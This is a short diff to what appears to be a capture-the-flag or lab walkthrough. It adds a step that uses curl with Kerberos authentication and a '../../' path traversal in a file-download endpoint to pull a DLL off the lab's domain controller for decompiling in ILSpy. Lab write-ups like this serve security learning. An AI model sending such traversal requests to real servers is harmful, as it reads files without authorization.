@@ -508,4 +508,14 @@ And now i get the contents
 
 Looks like its referring to a file `LuShare.dll`
 
-Ill read this 
+Ill download the DLL, since i wont be able to read it
+
+```python
+curl --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Download?fileName=../../LuShare.dll' --output LuShare.dll
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100  53760 100  53760   0      0 678.4k      0                              0
+```
+
+Now ill open it in ILspy
+
